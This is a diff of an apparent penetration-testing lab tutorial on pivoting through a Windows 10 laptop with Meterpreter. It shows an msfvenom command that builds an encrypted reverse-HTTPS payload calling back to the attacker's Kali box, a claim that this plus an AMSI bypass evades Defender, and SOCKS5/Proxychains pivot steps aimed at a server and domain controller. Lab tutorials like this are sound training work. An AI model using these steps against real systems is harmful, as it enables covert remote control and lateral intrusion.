@@ -1,10 +1,21 @@
 ===========================================================================================================================================
-Pivoting with Meterpreter (Metasploit) on a Windows machine (laptop or server)
+Pivoting with Meterpreter (Metasploit) 
 ===========================================================================================================================================
+
+Context / Test lab
+--------------------
+> Kali Linux (192.168.56.104)
+> Windows 10 Laptop with Defender AV enabled and up-to-date (192.168.1.113)
+> Windows 2016 server with Defender AV enabled and up-to-date (192.168.1.196)
+> Windows DC 2016 with Defender AV enabled and up-to-date (192.168.1.30)
+
+The Kali Linux box can't reach the network 192.168.1.0/24. 
+To be able to pivot and reach all the machines located in the network 192.168.1.0/24 we will execute a meterpreter session (reverse HTTPS shell with the autorun
+command and a proxy socks) on the WIndows 10 laptop to pivot and then attack the Windows server and the Domain Controller.
 
 
 ===========================================================================================================================================
-Step 1 - Set up the Metasploit handler and generate the Meterpreter payload (reverse HTTPS payload)
+Step 1 - Set up the Metasploit handler and generate the Meterpreter payload (reverse HTTPS payload) on the Kali Linux box
 ===========================================================================================================================================
 
 1 - Create a self signed SSL certificate that will be used for our reverse HTTPS payload
@@ -35,8 +46,8 @@ Email Address []:
 jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ cat pentest.key pentest.crt > pentest.pem
 
 
-2 - Generate an encrypted meterpreter (windows/meterpreter/reverse_https)
-----------------------------------------------------------------------------------------------------------------------
+2 - Generate an encrypted meterpreter with the payload 'windows/meterpreter/reverse_https'
+-------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.56.104 LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -97,10 +108,10 @@ HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
 
 
 ===========================================================================================================================================
-Step 2 - Run the Meterpreter payload (reverse HTTPS payload) on the target Windows machine
+Step 2 - Run the Meterpreter payload (reverse HTTPS) on the Windows 10 laptop with Defender AV enabled and up-to-date
 ===========================================================================================================================================
 
-Note: By generating an encrypted meterpreter payload and using an AMSI bypass our payload is not detected nor blocked by the Microsoft Defender AV running on the Windows target.
+Note: By generating an encrypted meterpreter payload and using an AMSI bypass, our payload is not detected nor blocked by the Microsoft Defender AV running on the Windows target.
 
 Microsoft Windows [Version 10.0.19044.2130]
 (c) Microsoft Corporation. All rights reserved.
@@ -119,7 +130,7 @@ PS C:\Users\Administrator\Documents\Tools-AD>
 
 
 ==============================================================================================================================================================
-Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network of the target Windows machine using a proxy socks5 and Proxychains
+Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network (192.168.1.0/24) using a proxy socks5 and Proxychains
 ==============================================================================================================================================================
 
 [*] Started HTTPS reverse handler on https://192.168.56.104:443
@@ -258,7 +269,7 @@ socks5  127.0.0.1 1080
 
   
 ============================================================================================================================================
-Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with meterprter to pivot into the internal network
+Step 4 - Use Proxychains on the Kali Linux server and the meterpreter tunnel to pivot into the internal network (192.168.1.0/24)
 ============================================================================================================================================
 
 Without going though the meterpreter session/tunnel, the Windows server with the IP '192.168.1.196' is not reachable from our Kali Linux box.
